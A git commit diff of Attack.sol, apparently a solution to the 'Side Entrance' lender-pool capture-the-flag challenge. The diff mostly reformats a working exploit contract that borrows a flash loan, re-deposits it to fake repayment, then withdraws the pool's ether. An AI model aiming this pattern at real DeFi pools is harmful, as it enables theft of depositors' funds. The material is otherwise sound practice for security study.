4a3fd6eb71a203aff87c533450c0bf0411338418
fps <anthony.nnaemeka.umeh@gmail.com>
2022-07-21 06:40:19 +0100

    Update Attack.sol

--- SideEntranceLenderPool/contracts/Attack.sol
+++ SideEntranceLenderPool/contracts/Attack.sol
@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.6.0;
+
 import "./SideEntranceLenderPool.sol";
 
 /*
@@ -7,37 +8,30 @@ import "./SideEntranceLenderPool.sol";
 * @author: Anthony (fps) https://github.com/fps8k .
 * @dev: 
 */
-
-contract Attack
-{
+contract Attack {
     uint256 public bal;
     SideEntranceLenderPool public _s;
+    
+    fallback() external {}
+    receive() external payable {}
 
-    function initialize(address _pool) public
-    {
+    function initialize(address _pool) public {
         _s = SideEntranceLenderPool(_pool);
     }
 
-    function balanceOf() public 
-    {
+    function balanceOf() public {
         bal = address(_s).balance;
     }
 
-    function attack(uint256 amount) public
-    {
+    function attack(uint256 amount) public {
         _s.flashLoan(amount);
     }
 
-    function execute() external payable
-    {
+    function execute() external payable {
         _s.deposit{value: msg.value}();
     }
 
-    function withdrawAll() public payable
-    {
+    function withdrawAll() public payable {
         _s.withdraw();
     }
-
-    fallback() external {}
-    receive() external payable {}
 }
